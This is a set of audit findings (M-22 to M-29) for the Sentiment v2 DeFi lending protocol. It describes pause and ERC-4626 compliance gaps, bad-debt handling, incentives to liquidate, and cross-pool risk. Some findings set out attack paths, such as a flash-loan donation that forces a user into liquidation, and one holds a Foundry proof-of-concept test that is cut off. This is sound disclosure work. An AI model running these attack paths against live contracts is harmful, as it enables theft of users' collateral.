# Issue M-22: `SuperPool` is ERC-4626 compliant, but the `maxWithdraw` & `maxRedeem` functions are not fully up to EIP-4626's specification 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/246 

## Found by 
000000, Atharv, Flare, h2134, pseudoArtist
## Summary
The `maxWithdraw` & `maxRedeem` functions should return the `0` when the withdrawal is `paused`, but in this case it is not returning 0.
## Vulnerability Detail
SuperPool can be paused, since it is pausable contract and also there is a function `togglePause()` , also in the readMe it is specifically written that `superPool` is supposed to be strictly ERC4626 compliant, i.e any issue arising from non compliance should be taken into account and will be a valid issue in this case.

According to [EIP-4626 specifications](https://eips.ethereum.org/EIPS/eip-4626):

`maxWithdraw`
```solidity
MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST
 return 0.
 ```
 `maxRedeem`
 
 ```solidity
MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST
 return 0.
 ```


But it is not enforced in our case and the `maxWithdraw` and `maxRedeem` functions are not having any logic to return 0 when to whole contract is paused and withdraw and redeem is disabled in that case.
## Impact

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L220-L223

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L226-L232
## Tool used

Manual Review

## Recommendation
Include a logic for returning 0 when the contract is paused.

# Issue M-23: None of the functions in SuperPool checks pause state 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/270 

## Found by 
000000, 0xAristos, 0xDemon, 0xLeveler, 0xMax1mus, 0xpranav, 4gontuk, A2-security, Atharv, Bigsam, EgisSecurity, Flare, HHK, Kalogerone, Mahi\_Vasisth, Mike\_Bello90, MohammedRizwan, Obsidian, Ryonen, ZeroTrust, aslanbek, cryptomoon, dimah7, h2134, oxkmmm, pseudoArtist, theweb3mechanic, wellbyt3
## Summary
None of the functions in SuperPool checks pause state.

## Vulnerability Detail
`SuperPool` contract is `Pausable`.
[SuperPool.sol#L25](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L25):
```solidity
contract SuperPool is Ownable, Pausable, ReentrancyGuard, ERC20 {
```
`togglePause()` is implemented to toggle pause state of the `SuperPool`.
[SuperPool.sol#L163-L167](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L163-L167):
```solidity
    /// @notice Toggle pause state of the SuperPool
    function togglePause() external onlyOwner {
        if (Pausable.paused()) Pausable._unpause();
        else Pausable._pause();
    }
```
However, none of the functions in `SuperPool` checks the pause state, renders the pause functionality meaningless. As confirmed with sponsor, pause state checking should be implemented on some functions.

## Impact
None of the functions in `SuperPool` can be paused.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L25

## Tool used
Manual Review

## Recommendation
It is recommend to implemented pause state checking on some of the functions, for example, and `deposit()` and `mint()` functions:
[SuperPool.sol#L258](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L258):
```diff
-    function deposit(uint256 assets, address receiver) public nonReentrant returns (uint256 shares) {
+    function deposit(uint256 assets, address receiver) public whenNotPaused nonReentrant returns (uint256 shares) {
```


[SuperPool.sol#L269](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L269):
```diff
-    function mint(uint256 shares, address receiver) public nonReentrant returns (uint256 assets) {
+    function mint(uint256 shares, address receiver) public whenNotPaused nonReentrant returns (uint256 assets) {
```

# Issue M-24: Exploiter can force user into unhealthy condition and liquidate him 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/299 

## Found by 
EgisSecurity
### Summary

Protocol implements a flexible cross-margin portfolio managment with the help of `Position` smart contract, which should hold borrower's collateral and debt positions. 
Anyone can open a pool in the singleton `Pool` contract and chose valid collateral assets with corresponding LTV values by calling `RiskEngine#requestLtvUpdate -> acceptLtvUpdate`. In the README it is stated that the bound for valid LTVs would be in the range 10%-98%
There is a flaw in the way risk module calculates whether a position is healthy. 

### Root Cause

The problem roots is that `_getPositionAssetData` uses [getAssetValue](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskModule.sol#L183-L185), which uses `IERC20(asset).balanceOf(position)` to obtain the tokens for the given asset in user's position:
```solidity
    function getAssetValue(address position, address asset) public view returns (uint256) {
        IOracle oracle = IOracle(riskEngine.getOracleFor(asset));
        uint256 amt = IERC20(asset).balanceOf(position);
        return oracle.getValueInEth(asset, amt);
    }
```
Later, when we calculate the `minRequired` collateral for given debt, we use a wighted average tvl based on the weights in the user position:
```solidity
                // debt is weighted in proportion to value of position assets. if your position
                // consists of 60% A and 40% B, then 60% of the debt is assigned to be backed by A
                // and 40% by B. this is iteratively computed for each pool the position borrows from
                minReqAssetValue += debtValuleForPool[i].mulDiv(wt[j], ltv, Math.Rounding.Up)
```
The problem is that expoiter may donate funds to user position with the collateral asset with the lowest LTV, which will manipulate [_getMinReqAssetValue](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskModule.sol#L250) calculation and may force the user into liquidation, where the expoiter will collect the donated funds + user collateral + discount.

### Internal pre-conditions

1. Borrower should have an asset portfolio with one asset with low LTV and other with large LTV.
2. Borrower should have most of his portfolio value in the asset with higher LTV 
3. Borrower should have an active loan and be close to liquidation, but still healthy

### External pre-conditions

Nothing special

### Attack Path

Imagine the following scenario:
We use $ based calculations for simplicity, but this does not matter for the exploit.
We also have simplified calculations to simple decimals (100% = 100) to remove unnececarry for this case complexity.

Precondition state:
Victim Position Asset Porfolio: [USDC = $1000; WBTC = $10]
Pool 1: [Leding Asset = DAI] [USDC tvl = 95%; WBTC tvl = 30%]

1. Victim borrows $940 DAI from pool 1 against his portfolio from above (`minReqAssetValue = (940 * 99 / 95) + (940 * 1 / 30) = 979 + 31 ~= $1 010`)
2. User position is healthy and collateral value is exactly the `minReqAssetValue`
Attack beggins:
3. Attacker take a flashloan of $990 WBTC and transfer it to the victim's position (WBTC has 30% ltv for this debt pool)
4. When he calls `liquidate`, we enter `validateLiquidation` -> `isPositionHealthy`, where we get each asset value and weight:
- We have  `totalAssetValue = $2000` `positinAssets = [USDC; WBTC]` , `positionAssetWeight = [50; 50]`
- We  pass those params to `_getMinReqAssetValue` and we iterate two times for the single $940 debt and here is the result
-  - 1st iteration (USDC): `minReqAssetValue += 940 * 50 / 95 = 494`
-  - 2nd iteration (WBTC) `minReqAssetValue += 940 * 50 / 30 = 1 566`
-  Result ~= `494 + 1 566 = $2 060` , which is `$60 > totalAssetValue`, which means that position is not healthy.
5. Liquidator has provided to repay all 940 against all collateral + the donated WBTC = $1000 USDC + $1000
6. His transaction passes and he has made profit, he rapays the flash loan

## Recommendation

Introduce virtual balance inside `position`, which is updated on deposit/withdraw actions. This will prevent manipulations of the weighted average tvl due to donations.

### Impact

Unfair liquidations, which in normal situations may never occur, result in the theft of user collateral.

### PoC

_No response_

### Mitigation

Introduce virtual balance inside position, which is updated on deposit/withdraw actions. This will prevent manipulations of the weighted average tvl due to donations. 

# Issue M-25: In liquidateBadDebt, transferring all the assets from the position to the protocol’s owner is unfair to the lender, as it increases the lender’s losses. 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/307 

The protocol has acknowledged this issue.

## Found by 
4rdiii, AlexCzm, Hearmen, Honour, KupiaSec, Mykola-ops, S3v3ru5, ZeroTrust, dhank, h2134, jennifer37
## Summary
In liquidateBadDebt, all the assets from the position are transferred to the protocol’s owner, while the lender bears the full loss of the entire borrowed amount, not just the under-collateralized portion (i.e., debtValue - assetValue). This results in an unfair outcome for the lender.

## Vulnerability Detail
```javascript
function liquidateBadDebt(address position) external onlyOwner {
        riskEngine.validateBadDebt(position);

        // transfer any remaining position assets to the PositionManager owner
        address[] memory positionAssets = Position(payable(position)).getPositionAssets();
        uint256 positionAssetsLength = positionAssets.length;
        for (uint256 i; i < positionAssetsLength; ++i) {
            uint256 amt = IERC20(positionAssets[i]).balanceOf(position);
@>>            try Position(payable(position)).transfer(owner(), positionAssets[i], amt) { } catch { }
        }

        // clear all debt associated with the given position
        uint256[] memory debtPools = Position(payable(position)).getDebtPools();
        uint256 debtPoolsLength = debtPools.length;
        for (uint256 i; i < debtPoolsLength; ++i) {
@>>            pool.rebalanceBadDebt(debtPools[i], position);
@>>            Position(payable(position)).repay(debtPools[i], type(uint256).max);
        }
    }
```
We can see in the liquidateBadDebt function that all of the position’s assets are transferred to the owner, but none of the debt is actually repaid.
```javascript
  function rebalanceBadDebt(uint256 poolId, address position) external {
        PoolData storage pool = poolDataFor[poolId];
        accrue(pool, poolId);

        // revert if the caller is not the position manager
        if (msg.sender != positionManager) revert Pool_OnlyPositionManager(poolId, msg.sender);

        // compute pool and position debt in shares and assets
        uint256 totalBorrowShares = pool.totalBorrowShares;
        uint256 totalBorrowAssets = pool.totalBorrowAssets;
        uint256 borrowShares = borrowSharesOf[poolId][position];
        // [ROUND] round up against lenders
        uint256 borrowAssets = _convertToAssets(borrowShares, totalBorrowAssets, totalBorrowShares, Math.Rounding.Up);

        // rebalance bad debt across lenders
@>>        pool.totalBorrowShares = totalBorrowShares - borrowShares;
        // handle borrowAssets being rounded up to be greater than totalBorrowAssets
@>>        pool.totalBorrowAssets = (totalBorrowAssets > borrowAssets) ? totalBorrowAssets - borrowAssets : 0;
        uint256 totalDepositAssets = pool.totalDepositAssets;
@>>        pool.totalDepositAssets = (totalDepositAssets > borrowAssets) ? totalDepositAssets - borrowAssets : 0;
        borrowSharesOf[poolId][position] = 0;
    }
```
In the rebalanceBadDebt function, the debt is only cleared at the accounting level, without transferring the actual funds needed to repay the debt. Directly reducing borrowAssets from totalDepositAssets forces all lenders to bear the loss of the borrowed funds.

```javascript
 function repay(uint256 poolId, uint256) external onlyPositionManager {
        if (POOL.getBorrowsOf(poolId, address(this)) == 0) debtPools.remove(poolId);
    }
```
We can see that in the position.repay() function, there is also no actual transfer of funds to repay the debt.
## Impact
The lender bears the full loss of the borrowed funds, not just the under-collateralized portion (i.e., debtValue - assetValue), while the owner profits. This is extremely unfair to the lender.
## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L446

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L528
## Tool used

Manual Review

## Recommendation
The protocol should either repay all of the debt or sell the position’s collateral (assets) into the debt token to cover the outstanding debt.

# Issue M-26: The liquidate() function requires that after liquidation, the position must be in a healthy state. This may result in certain positions never being liquidated if they cannot reach a healthy state, potentially leaving them in limbo. 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/309 

## Found by 
ZeroTrust

## Summary
Since the position’s funds are discounted during liquidation, this could further deteriorate the position’s health instead of restoring it. As a result, the lender’s funds could be exposed to even greater risk, rather than mitigating the situation as intended.
## Vulnerability Detail
```javascript
    function liquidate(
        address position,
        DebtData[] calldata debtData,
        AssetData[] calldata assetData
    ) external nonReentrant {
        riskEngine.validateLiquidation(position, debtData, assetData);

        // liquidate
        _transferAssetsToLiquidator(position, assetData);
        _repayPositionDebt(position, debtData);

        // position should be within risk thresholds after liquidation
@>>        if (!riskEngine.isPositionHealthy(position)) revert PositionManager_HealthCheckFailed(position);
        emit Liquidation(position, msg.sender, ownerOf[position]);
    }
```
We can see that the liquidate() function requires the position to be in a healthy state after liquidation. Although liquidators are given the opportunity to acquire collateral at a discounted price (e.g., 10%), because the position must be restored to a healthy state after liquidation, the liquidator’s profit in some cases may be very small or even nonexistent. This lack of incentive for the liquidator could result in certain positions remaining unliquidated, leading to further losses for the lender.

Proof of Concept (POC):

Let’s take an example scenario:

Assume an asset has an LTV of 98%, a price of 1, and a quantity of 100.

The borrow token quantity is 98, with a price of 1, and the borrowed amount is 98.

The loan value is 98, and the minimum collateral value is 100.

The position is currently in a healthy state.


When the price drops by 1.5%, i.e., the price becomes 0.985, the collateral value is 98.5, which is less than 100.

At this point, the position becomes eligible for liquidation.

The liquidator’s profit from liquidating the entire position would be 1. However, the discounted price is calculated as   1-98.5/99 = 0.5% , which results in a 0.5% discount—far below the expected 10%. This might not be sufficient to motivate the liquidator to liquidate the position.

As a result, if the price drops further, the liquidator’s profit decreases even more. In the volatile world of cryptocurrencies, a 20%-30% price drop is common during market crashes, which could lead to a large number of positions becoming unliquidatable.

If the liquidator liquidates a portion of the position at a discounted price (10%), it would actually make the position even more unhealthy, causing the transaction to revert.

For example, if the liquidator tries to liquidate 10 borrow tokens, they would need to acquire collateral equivalent to:


10*1/（0.985 *（1-10%）） = 11.28


The remaining position would be:

	•	Borrow tokens: 88
	•	Required collateral: 89.7959
	•	Remaining collateral: 88.71968
	•	Value of remaining collateral: 87.3888

As we can see, the health of the position decreases further rather than restoring it to a healthy state. This worsens the situation and prevents the position from being brought back to a healthy state, leading to a revert.

Therefore, this creates a situation where the position becomes unliquidatable.


## Impact
Some positions cannot be liquidated, resulting in losses for the lender.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L430
## Tool used

Manual Review

## Recommendation
The liquidation process should be allowed as long as it does not worsen the health of the position, even if it doesn’t fully restore the position to a healthy state. This would help minimize losses for the lender.

# Issue M-27: Under certain circumstances bad debt will cause first depositor to lose funds 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/319 

## Found by 
EgisSecurity
### Summary
The protocol handles bad debt through [`PositionManager::liquidateBadDebt()`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L446)

```solidity
 function liquidateBadDebt(address position) external onlyOwner {
        riskEngine.validateBadDebt(position);

        // transfer any remaining position assets to the PositionManager owner
        address[] memory positionAssets = Position(payable(position)).getPositionAssets();
        uint256 positionAssetsLength = positionAssets.length;
        for (uint256 i; i < positionAssetsLength; ++i) {
            uint256 amt = IERC20(positionAssets[i]).balanceOf(position);
            try Position(payable(position)).transfer(owner(), positionAssets[i], amt) { } catch { }
        }

        // clear all debt associated with the given position
        uint256[] memory debtPools = Position(payable(position)).getDebtPools();
        uint256 debtPoolsLength = debtPools.length;
        for (uint256 i; i < debtPoolsLength; ++i) {
            pool.rebalanceBadDebt(debtPools[i], position);
            Position(payable(position)).repay(debtPools[i], type(uint256).max);
        }
    }
```

The function is used to handle bad debt if it occurs for a specific `position`.

Let's examine `pool.rebalanceBadDebt`:

```solidity
function rebalanceBadDebt(uint256 poolId, address position) external {
        PoolData storage pool = poolDataFor[poolId];
        accrue(pool, poolId);

        // revert if the caller is not the position manager
        if (msg.sender != positionManager) revert Pool_OnlyPositionManager(poolId, msg.sender);

        // compute pool and position debt in shares and assets
        uint256 totalBorrowShares = pool.totalBorrowShares;
        uint256 totalBorrowAssets = pool.totalBorrowAssets;
        uint256 borrowShares = borrowSharesOf[poolId][position];
        // [ROUND] round up against lenders
        uint256 borrowAssets = _convertToAssets(borrowShares, totalBorrowAssets, totalBorrowShares, Math.Rounding.Up);

        // rebalance bad debt across lenders
        pool.totalBorrowShares = totalBorrowShares - borrowShares;
        // handle borrowAssets being rounded up to be greater than totalBorrowAssets
        pool.totalBorrowAssets = (totalBorrowAssets > borrowAssets) ? totalBorrowAssets - borrowAssets : 0;
        uint256 totalDepositAssets = pool.totalDepositAssets;
        pool.totalDepositAssets = (totalDepositAssets > borrowAssets) ? totalDepositAssets - borrowAssets : 0;
        borrowSharesOf[poolId][position] = 0;
    }
```

Wen ca see that `totalBorrowShares,  totalBorrowAssets  and totalDepositAssets` decremented by their respective values (shares and assets).

When bad debt occurs and is liquidated, it's basically written off the protocol and the losses are socialized between all the depositors of that pool.

There is 1 problem with this, if a `position` has borrowed the entire assets of the `pool` and is liquidated due to bad debt. This is realistic if the pool is unpopular for some reason (niche token, high fees, etc...). Note that this can also occur when all positions incur bad debt and their debt gets socialized, but it's a rarer for this to happen.

The problem will be the fact that `totalDepositAssets` will equal 0. When it's 0, when a user deposits into the pool, his shares are minted 1:1 to the assets he is providing, which is a problem, because there are other shares in the pool at this time, the shares of the depositors that got socialized the bad debt.

Example:
- We assume that there are no fees just to simplify the math.

1. Alice deposits 100 tokens in the pool and she gets 100 shares, due to her being the first depositor the shares are minted 1:1.
2. Bob borrows all 100 tokens. Now, `totalDepositAssets == totalBorrowAssets`.
3. Time passes and 50 interest is accrued, now `totalDepositAssets = 150` and `totalBorrowAssets = 150`.
4. Bob is eligible to be liquidated, but he isn't. This can happen due to lack of incentive for liquidators, Bob's collateral plummets in price very quickly, Bob's loan goes up in price very quickly.
5. Bob has now accumulated bad debt and the debt is liquidated through `liquidateBadDebt`.
6. When `rebalanceBadDebt` is called both `totalDepositAssets` and `totalBorrowAssets` equal 0.
7. At this point, `totalDepositAssets = 0`, but `totalDepositShares = 100`.
8. Charlie deposits another 100 assets into the pool and his shares are minted 1:1 again, due to this:
```solidity
 function _convertToShares(
        uint256 assets,
        uint256 totalAssets,
        uint256 totalShares,
        Math.Rounding rounding
    ) internal pure returns (uint256 shares) {
        if (totalAssets == 0) return assets;
        shares = assets.mulDiv(totalShares, totalAssets, rounding);
    }
```
9. Charlie receives 100 shares, but Alice also has 100 shares and there are only 100 assets in the pool, so Charlie actually received the penalties of the debt being socialized, even though he deposited after the liquidation of bad debt.

### Root Cause
Allowing for 100% utilization of assets.

Note that only 1 of the 3 bellow have to happen in order for the issue to occur.
### Internal pre-conditions
Optional:
1. The interest becomes to high.

### External pre-conditions
Optional:
1. The price of the collateral drops
2. The price of the debt goes up

### Attack Path

None

### Impact
Loss of funds

### PoC
None

### Mitigation
Don't allow for pools to reach 100% utilization.

# Issue M-28: Pool::liquidate() 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/320 

## Found by 
EgisSecurity
### Summary
In lending/borrowing protocols, [liquidations](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L430) are done by liquidators who are users (or bots) that liquidate positions based of an incentive. For example repaying 100$ debt and receiving 110$ in return, so they turn a 10$ profit.

If there are no incentives to liquidate someone, then liquidators won't liquidate them, so it's very important to always have an incentive otherwise the protocol can incur bad debt.

In Sentiment there are several ways for liquidators to not have an incentive to liquidate an unhealthy position.

1. Dust positions: A user can have a position with up to 5 dust loans. In this situation the gas that the liquidator has to pay (especially on mainnet) will outweigh the amount of collateral they will receive in return for repaying the loan.
2. User gets his collateral blacklisted: If position has collateral which supports blacklisting like USDC/USDT, which are both supported by the protocol. If the position is blacklisted, then the collateral cannot be transferred, so the liquidator won't be able to receive it, thus tanking his incentive significantly.
3. Liquidation fee: The protocol implements a liquidation fee, which is a % of the collateral that goes to the `owner()` when a position gets liquidated. When the fee is applied, there might not be enough tokens as an incentive for the liquidator, in extreme cases he might even lose money if he liquidates a position.
4. Very high LTV assets: The protocol has provided [these example values](https://gist.github.com/ruvaag/58c9fc2e5c139451c83c21fda27b77a2). We can see that WETH has 95% LTV. This means that the liquidator can get a max discount of 5%, trying to get the full 10% discount is impossible since there won't be enough tokens in the position. This combined with a smaller loan and higher gas costs diminish the incentive for liquidations.

Example of point 3:
I'll be using $ values to simplify the example:

1. Liquidation fee is 20%.
2. Position has USDC as collateral with 90% LTV.
3. The position has 100$ collateral and their debt is 92$ so they can be liquidated.
4. The liquidator is expecting to pay 92$ of debt and retrieve 100$ worth of collateral, netting a 8$ profit.
5. But because of the 20% liquidation fee, he will actually receive 80$ worth of collateral, since 20$ (20%) go to the owner as part of the liquidation fee. In this case he will actually lose 12$ for repaying the debt, which he obviously won't do.


### Root Cause
There are several causes:
1. Allowing `minDebt` and `minBorrow` to be 0 or a very small value. The README of the contest states:
> Min Debt = from 0 to 0.05 ETH = from 0 to 50000000000000000 Min Borrow = from 0 to 0.05 ETH
2. Collateral with high LTV (~90% and up) and higher liquidation fee diminish the incentive for liquidations substantially and can even cause loses.
> Min LTV = 10% = 100000000000000000 Max LTV = 98% = 980000000000000000
> Liquidation Fee = 0 (Might be increased to 20-30% in the future)
3. Higher liquidation fees.

### Internal pre-conditions
One or all of the following, they can all cause the lack of incentive:
1. `minDebt` and `minBorrow` equal 0 or a very small number.
2. High LTV assets.
3. Liquidation fee combined with a relative LTV.

### External pre-conditions
None

### Attack Path
None

### Impact
No incentive to liquidate positions, which can lead to bad debt and loss of funds for users in the long run.

### PoC
None

### Mitigation
Enforce a higher `minDebt` and `minBorrow`. Enforce a smaller or no liquidation fee. Decrease max allowed LTV.

# Issue M-29: Liquidators may repay a position's debt to pools that are within their risk tolerance, breaking the concept of isolated risk in base pools 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/382 

## Found by 
HHK, Nihavent
## Summary

The trust model of the protocol is such that depositors to pools must trust the pool owners, however there was no documented trust assumption between base pool owners. Creating a base pool is permissionless so the owner of pool A shouldn't be able to do something that adversely affects pool B.

However, liquidations that affect Pool B can be caused by Pool A's risk settings despite the position being within Pool B's risk tolerance, which means base pools do not have isolated risk and there is a trust assumption between base pool owners.

According to the [Sentiment Docs](https://docs.sentiment.xyz/concepts/core-concepts/isolated-pools#base-pools), one of the core concepts is isolated financial activities and risk:

>"Each Base Pool operates independently, ensuring the isolation of financial activities and risk."

But with the current design, the LTVs set by a base pool impacts the likelihood of liquidations in every other base pool which shares a common position via loans.


## Vulnerability Detail

A position with debt and recognized assets is determined to be healthy if the recognized collateral exceeds the `minReqAssetValue`:

```javascript

    function isPositionHealthy(address position) public view returns (bool) {
        // a position can have four states:
        // 1. (zero debt, zero assets) -> healthy
        // 2. (zero debt, non-zero assets) -> healthy
        // 3. (non-zero debt, zero assets) -> unhealthy
        // 4. (non-zero assets, non-zero debt) -> determined by weighted ltv

        ... SKIP!...

@>      uint256 minReqAssetValue =
            _getMinReqAssetValue(debtPools, debtValueForPool, positionAssets, positionAssetWeight, position);
        return totalAssetValue >= minReqAssetValue; // (non-zero debt, non-zero assets)
    }
```

`_getMinReqAssetValue` is the sum of required asset value across all collateral tokens and debt positions, adjusted for: the weight of each collateral token, magnitude of debt from a given pool, and the ltv setting for that asset set by that pool:

```javascript
    function _getMinReqAssetValue(
        uint256[] memory debtPools,
        uint256[] memory debtValuleForPool,
        address[] memory positionAssets,
        uint256[] memory wt,
        address position
    ) internal view returns (uint256) {
        uint256 minReqAssetValue;

        ... SKIP!...

        uint256 debtPoolsLength = debtPools.length;
        uint256 positionAssetsLength = positionAssets.length;
        for (uint256 i; i < debtPoolsLength; ++i) {
            for (uint256 j; j < positionAssetsLength; ++j) {
                uint256 ltv = riskEngine.ltvFor(debtPools[i], positionAssets[j]);
                ... SKIP!...
@>              minReqAssetValue += debtValuleForPool[i].mulDiv(wt[j], ltv, Math.Rounding.Up);
            }
        }
        ... SKIP!...
        return minReqAssetValue;
    }
```

Note from above, that a position is either healthy or unhealthy across all debtPools and assets held by the position. There is no allocation of collateral to a debt position with respect to it's risk parameters. This means that the risk settings of one pool can directly impact the ability to liquidate a position in another pool.

Also note, in the [liquidation flow](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L430-L444), liquidators are [free to chose which assets they seize and which debt they repay](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L432-L433), as long as the position returns to a [healthy state after the liquidation](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L442). This means that debt from a pool may be repaid even though the position was within the risk parameters of that pool.

Base pool owners are able to set LTV for assets individually through a [request /](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L167-L187) [accept](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L190-L210) pattern. 
But as shown, LTVs set by base pools do not strictly impact the risk in their pool, but all pools for which a single position has debt in. 

There is a [timelock delay](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L182) on proposed changes to LTV, and here is why this doesn't completely mitigates this issue:
1. The issue doesn't not require a change in LTV in any pool for a pool to be exposed to the risk settings of another pool via a liquidated position (that is just the adversarial-pool attack path).
2. There is no limit on how many different positions a pool will loan to at any given time (call this numPools). Each position a pool loans to can have debts in [up to 4 other pools](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Position.sol#L25). So even though a [`TIMELOCK_DURATION`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L20) of 24 hours is implemented, it may not be practical for pools to monitor the proposed LTV changes for up to numPools^4 (numPools is uncapped).
3. An adversarial pool could propose an LTV setting, then all other impacted pools may notice this and respond by adjusting their own LTVs to ensure their `totalBorrowAssets` is minimally impacted, then the adverserial pool may not even accept the proposed setting. Even if the setting is accepted there will be a window between when the first pool is allowed to update the settings and when other pools are able to, in which liquidations can occur.


## Impact

- Pool A's risk settings can cause liquidations in Pool B, despite the debt position being within the risk tolerance of Pool B.
- The liquidation of Pool B would decrease borrow volume and utilization which decreases earnings for all depositors (both through volume and rate in the linear and kinked IRM models).
- This may occur naturally, or through adversarial pools intentionally adjusting the LTV of assets to cause liquidations. In fact they may do this to manipulate the utilization or TVL in other pools, or to liquidate more positions themselves and claim the liquidation incentives.


## Code Snippet

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L67-L85
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L250-L278


## POC

Paste the below coded POC into LiquidateTest.t.sol. 

Simply put, it shows a single debt position on a pool get liquidated when the collateral price did not change and the pool owner did not change LTV settings. The sole cause of the liquidation was another pool changing their LTV settings.

Step by step:
1. user deposits into base fixedRatePool and linearRatePool which both accept asset1. Both pools accept asset2 as collateral.
   - fixedRatePool has an LTV for asset2 of 70% (ie. minReqCollateral = debt / .7)
   - linearRatePool has an LTV for asset2 of 70% (ie. minReqCollateral = debt / .7)
2. user2 opens a position and deposits 3e18 asset2 as collateral
3. user2 borrows from both pools and has a healthy position:
   - user2 borrows 1e18 from fixedRatePool and 1e18 from linearRatePool
   - minReqCollateral = (1e18 * 1e18 / 0.7e18) + (1e18 * 1e18 / 0.7e18) = 1.428571e18 + 1.428571e18 = 2.857142e18
4. fixedRatePool decides to decrease the LTV setting for asset2 to 60%
5. Position is no longer health because minReqCollateral = (1e18 * 1e18 / 0.6e18) + (1e18 * 1e18 / 0.7e18) = 1.666e18 + 1.428571e18 = 3.094571e18
6. A liquidator, which could be controlled by the owner of fixedRatePool then liquidates the position which has become unhealthy by repaying the debt from linearRatePool, thus impacting the utilization and interest rate of linearRatePool, despite the collateral price not changing and the owner of linearRatePool not adjusting it's LTV settings.


```javascript
    function test_AuditBasePoolsShareRisk() public {

        // Pool risk settings
        vm.startPrank(poolOwner);
        riskEngine.requestLtvUpdate(fixedRatePool, address(asset2), 0.7e18); 
        riskEngine.requestLtvUpdate(linearRatePool, address(asset2), 0.7e18); 
        vm.warp(block.timestamp +  24 * 60 * 60); // warp to satisfy timelock
        riskEngine.acceptLtvUpdate(fixedRatePool, address(asset2));
        riskEngine.acceptLtvUpdate(linearRatePool, address(asset2));
        vm.stopPrank();

        // 1. user deposits into base fixedRatePool and linearRatePool which both accept asset1. Both pools accept asset2 as collateral.
        vm.startPrank(user);
        asset1.mint(user, 20e18);
        asset1.approve(address(pool), 20e18);
        pool.deposit(fixedRatePool, 10e18, user);
        pool.deposit(linearRatePool, 10e18, user);
        vm.stopPrank();

        // 2. user2 opens a position and deposits 3e18 asset2 as collateral
        vm.startPrank(user2);
        asset2.mint(user2, 3e18);
        asset2.approve(address(positionManager), 3e18); // 3e18 asset2
        
        Action[] memory actions = new Action[](5);
        (position, actions[0]) = newPosition(user2, bytes32(uint256(0x123456789)));
        actions[1] = deposit(address(asset2), 3e18);
        actions[2] = addToken(address(asset2));

        // 3. user2 borrows from both pools and has a healthy position:
        actions[3] = borrow(fixedRatePool, 1e18);
        actions[4] = borrow(linearRatePool, 1e18);
        positionManager.processBatch(position, actions);
        assertTrue(riskEngine.isPositionHealthy(position));
        vm.stopPrank();


        // 4. fixedRatePool decides to decrease the LTV setting for asset2 to 60%
        vm.startPrank(poolOwner);
        riskEngine.requestLtvUpdate(fixedRatePool, address(asset2), 0.6e18); 
        vm.warp(block.timestamp + 24 * 60 * 60); // warp to satisfy timelock
        riskEngine.acceptLtvUpdate(fixedRatePool, address(asset2));
        vm.stopPrank();

        // 5. Position is no longer health because minReqCollateral = (1e18 * 1e18 / 0.6e18) + (1e18 * 1e18 / 0.7e18) = 1.666e18 + 1.428571e18 = 3.094571e18
        assertTrue(!riskEngine.isPositionHealthy(position));

        // 6. A liquidator, which could be controlled by the owner of fixedRatePool then liquidates the position which has become unhealthy by repaying the debt from linearRatePool, thus impacting the utilization and interest rate of linearRatePool, despite the collateral price not changing and the owner of linearRatePool not adjusting it's LTV settings.
        DebtData[] memory debts = new DebtData[](1);
        DebtData memory debtData = DebtData({ poolId: linearRatePool, amt: type(uint256).max });
        debts[0] = debtData;

        AssetData memory asset1Data = AssetData({ asset: address(asset2), amt: 1.25e18 });
        AssetData[] memory assets = new AssetData[](1);
